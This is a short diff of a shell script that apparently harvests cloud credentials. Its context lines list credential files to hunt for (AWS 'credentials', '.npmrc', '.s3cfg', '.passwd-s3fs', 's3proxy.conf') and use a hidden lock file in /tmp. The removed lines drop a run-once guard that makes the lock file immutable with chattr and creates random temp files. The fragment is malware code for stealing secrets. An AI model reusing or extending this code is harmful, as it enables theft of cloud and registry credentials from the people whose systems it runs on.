@@ -15,13 +15,6 @@ trap notraces 1 3 9
 LOCK_FILE="/tmp/.aws.c2g.lock"
 TIME_1_OUT=90
 
-if [ ! -f "$LOCK_FILE" ]; then
-touch $LOCK_FILE 2>/dev/null 1>/dev/null
-chattr +i $LOCK_FILE 2>/dev/null 1>/dev/null
-
-CSOF="/tmp/$RANDOM"
-EDIS="/tmp/$RANDOM$RANDOM"
-touch $CSOF
 
 ACF=("credentials" "cloud" ".npmrc" \
 "credentials.gpg" ".s3cfg" ".passwd-s3fs" "authinfo2" ".s3backer_passwd" ".s3b_config" "s3proxy.conf")
@@ -190,10 +183,5 @@ int_main
 chattr -i $LOCK_FILE 2>/dev/null 1>/dev/null
 rm -f $LOCK_FILE 2>/dev/null 1>/dev/null
 
-
-else
-echo "no dubble"
-
-fi
 
 ##########End##########
